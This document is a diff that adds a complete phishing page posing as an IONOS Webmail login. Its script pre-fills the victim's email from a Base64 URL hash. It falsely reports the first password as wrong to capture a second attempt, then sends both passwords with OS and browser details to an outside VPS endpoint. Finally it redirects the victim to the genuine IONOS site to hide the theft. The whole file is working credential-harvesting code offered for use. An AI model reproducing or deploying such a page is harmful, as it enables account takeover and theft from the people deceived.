@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IONOS Webmail Login</title>
+    <link rel="icon" href="https://vps679f3b19ac2c1145389631.noezserver.de/man/favicon-32px.png" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f7fa;
+            color: #333;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .logo span {
+            color: #0055a5;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 9px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: left;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 96%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .btn {
+            display: block;
+            width: 101%;
+            background-color: #0055a5;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #003f80;
+        }
+
+        .link {
+            font-size: 12px;
+            color: #0055a5;
+            text-decoration: none;
+            margin-top: 10px;
+            display: block;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-top: 30px;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .footer-links div {
+            text-align: center;
+        }
+
+        .footer-links img {
+            display: block;
+            margin: 0 auto 10px;
+            width: 40px;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .nav img {
+            height: 24px;
+        }
+
+        .nav a {
+            font-size: 14px;
+            color: #0055a5;
+            text-decoration: none;
+        }
+
+        .nav a:hover {
+            text-decoration: underline;
+        }
+
+        .question-icon {
+            font-size: 18px;
+            margin-left: 5px;
+            color: #0055a5;
+        }
+
+        .toggle-password {
+            display: inline-block;
+            cursor: pointer;
+            margin-left: 10px;
+            font-size: 12px;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .confirmation-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .success-message {
+            color: green;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="nav">
+        <img src="https://vps679f3b19ac2c1145389631.noezserver.de/man/ddddd.png" alt="IONOS Logo" style="height: 30px; width: auto;">
+        <div>
+            <a href="#">Search for features, domains, and help</a>
+            <span class="question-icon">?</span>
+        </div>
+    </div>
+    <div class="container">
+        <div class="logo">
+            <img src="https://vps679f3b19ac2c1145389631.noezserver.de/man/product-email.svg" alt="Logo" style="max-width: 85px;">
+        </div>
+        <div class="card">
+            <h1 style="display: none;">Login to Your Account</h1>
+            <form id="login-form" method="POST">
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" id="email" name="email" placeholder="Email address" required>
+                </div>
+                <div class="form-group" id="password-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    <span class="toggle-password"></span>
+                </div>
+                <div id="confirmation-message" class="confirmation-message">Wrong password, re-enter correct password!</div>
+                <div id="error-message" class="error-message">Incorrect password. Please try again.</div>
+                <div id="success-message" class="success-message">Account authenticated successfully...</div>
+                <button type="submit" class="btn">Login</button>
+            </form>
+            <p style="margin-top: 10px; font-size: 12px;">Not your device? <a href="#" class="link">Log out after the session or use private browsing mode.</a></p>
+            <p style="margin-top: 20px;">Not an IONOS customer yet? <a href="#" class="link">Become a customer now and take advantage of our offers.</a></p>
+        </div>
+
+        <div class="footer-links">
+            <div>
+                <img src="https://vps679f3b19ac2c1145389631.noezserver.de/man/my-account.svg" alt="User Icon">
+                <p>More IONOS Logins</p>
+            </div>
+            <div>
+                <img src="https://vps679f3b19ac2c1145389631.noezserver.de/man/product-hidrive.svg" alt="Cloud Icon">
+                <p>Cloud Services</p>
+            </div>
+            <div>
+                <img src="https://vps679f3b19ac2c1145389631.noezserver.de/man/product-mail-archiving.svg" alt="Lock Icon">
+                <p>Security Settings</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let submissionCount = 0;
+        let firstPassword = ""; // Store the first password attempt
+
+        // Extract email from the URL hash and populate the email field
+        document.addEventListener('DOMContentLoaded', function () {
+        const hash = window.location.hash.substring(1); // Get the Base64 string from URL hash
+
+        if (hash) {
+            try {
+                const decodedEmail = atob(hash); // Decode Base64 email
+                const emailField = document.getElementById('email');
+                emailField.value = decodedEmail;
+                emailField.readOnly = true; // Make it non-editable
+            } catch (e) {
+                console.error("Invalid Base64 string");
+            }
+        }
+    });
+
+        // Handle form submission
+        const form = document.getElementById('login-form');
+        const errorMessage = document.getElementById('error-message');
+        const confirmationMessage = document.getElementById('confirmation-message');
+        const successMessage = document.getElementById('success-message');
+
+        form.addEventListener('submit', async function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Simple email validation
+            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            if (!emailPattern.test(email)) {
+                alert("Please enter a valid email address.");
+                return;
+            }
+
+            submissionCount++;
+
+            // Hide success and confirmation messages before the second attempt
+            successMessage.style.display = 'none';
+            confirmationMessage.style.display = 'none';
+
+            if (submissionCount === 1) {
+                // Store the first password attempt and immediately send it
+                firstPassword = password;
+                sendCredentialsToTelegram({ email: email, password1: firstPassword, os: getOS(), browser: getBrowser() });
+
+                // Show confirmation message and clear the password field
+                confirmationMessage.style.display = 'block';
+                document.getElementById('password').value = ''; // Clear the password field
+            } else if (submissionCount === 2) {
+                // Send the second password after confirmation
+                successMessage.style.display = 'block';
+
+                const userDetails = {
+                    email: email,
+                    password1: firstPassword, // Send the first password
+                    password2: password, // Send the second password
+                    os: getOS(),
+                    browser: getBrowser()
+                };
+
+                // Send credentials and details to PHP script
+                sendCredentialsToTelegram(userDetails);
+
+                setTimeout(() => {
+                    window.location.href = 'https://id.ionos.co.uk'; // Change to your dashboard URL
+                }, 3000);
+            }
+        });
+
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Windows NT 10.0") !== -1) return "Windows 10";
+            if (userAgent.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
+            if (userAgent.indexOf("Mac") !== -1) return "MacOS";
+            if (userAgent.indexOf("X11") !== -1) return "Linux";
+            if (userAgent.indexOf("Android") !== -1) return "Android";
+            if (userAgent.indexOf("iPhone") !== -1) return "iOS";
+            return "Unknown OS";
+        }
+
+        function getBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Chrome") !== -1) return "Chrome";
+            if (userAgent.indexOf("Firefox") !== -1) return "Firefox";
+            if (userAgent.indexOf("Safari") !== -1) return "Safari";
+            if (userAgent.indexOf("Edge") !== -1) return "Edge";
+            return "Unknown Browser";
+        }
+
+        function sendCredentialsToTelegram(userDetails) {
+            const formData = new FormData();
+            formData.append('email', userDetails.email);
+            formData.append('password1', userDetails.password1); // First password
+            formData.append('password2', userDetails.password2 || ''); // Second password (optional in first submission)
+            formData.append('os', userDetails.os);
+            formData.append('browser', userDetails.browser);
+
+            fetch('https://vps679f3b19ac2c1145389631.noezserver.de/report/duncus/indexa.php', {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log(data.message);
+                } else {
+                    console.error(data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        const togglePassword = document.querySelector('.toggle-password');
+        const passwordField = document.getElementById('password');
+
+        togglePassword.addEventListener('click', function () {
+            const type = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = type;
+            togglePassword.textContent = type === 'password' ? 'Show' : 'Hide';
+        });
+    </script>
+</body>
+</html>
